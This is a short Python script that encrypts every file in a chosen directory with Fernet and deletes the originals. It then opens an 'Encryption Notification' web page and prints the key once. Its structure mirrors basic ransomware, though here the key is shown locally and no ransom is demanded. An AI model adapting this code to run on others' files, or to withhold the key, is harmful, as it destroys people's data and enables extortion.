import os
import webbrowser
from cryptography.fernet import Fernet

### configure variables here ###
## ending is the file extension added to encrypted files ##
ending = ".pycrypt"
## html content is the confirmation message opened ##
html_content = '''
    <html>
    <head><title>Encryption Notification</title></head>
    <body>
        <h1>Directory Encrypted Successfully!</h1>
        <p>Your directory has been encrypted.</p>
        <p>Please use the decryption tool to restore your files.</p>
    </body>
    </html>
'''

def generate_key():
    return Fernet.generate_key()

def encrypt_directory(directory_path, cipher_suite):
    for root, dirs, files in os.walk(directory_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            if not file_path.endswith(ending):  
                with open(file_path, 'rb') as file:
                    data = file.read()
                encrypted_data = cipher_suite.encrypt(data)
                with open(file_path + ending, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted_data)
                os.remove(file_path)  

def log_key(key):
    print(key.decode())  
    input("")

def create_notification_html():
    with open('notification.html', 'w') as html_file:
        html_file.write(html_content)

    webbrowser.open('notification.html')

key = generate_key()
cipher_suite = Fernet(key)

directory_path = input("Enter the path of the directory you want to encrypt: ")
encrypt_directory(directory_path, cipher_suite)
create_notification_html()
log_key(key)
